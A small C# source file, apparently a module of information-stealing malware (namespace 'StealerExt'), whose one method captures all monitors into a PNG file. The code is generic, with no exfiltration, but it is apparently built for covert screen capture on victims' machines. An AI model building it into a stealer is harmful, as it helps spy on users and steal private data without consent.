using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Windows.Forms;

namespace StealerExt
{
    public class Capture
    {
        #region Get ScreenSize & Capture
        public static void CaptureScreen(string file)
        {
            int screenCount = Screen.AllScreens.Length;
            int screenTop = SystemInformation.VirtualScreen.Top;
            int screenLeft = SystemInformation.VirtualScreen.Left;
            int screenWidth = Screen.AllScreens.Max(x => x.Bounds.Width);
            int screenHeight = Screen.AllScreens.Max(x => x.Bounds.Height);
            bool isVertical = (SystemInformation.VirtualScreen.Height < SystemInformation.VirtualScreen.Width);
            if (isVertical)
                screenWidth *= screenCount;
            else
                screenHeight *= screenCount;
            using (Bitmap bmp = new Bitmap(screenWidth, screenHeight, PixelFormat.Format32bppPArgb))
            {
                using (Graphics g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(screenLeft, screenTop, 0, 0, bmp.Size);
                }
                bmp.Save(file, ImageFormat.Png);
            }
        }
        #endregion
    }
}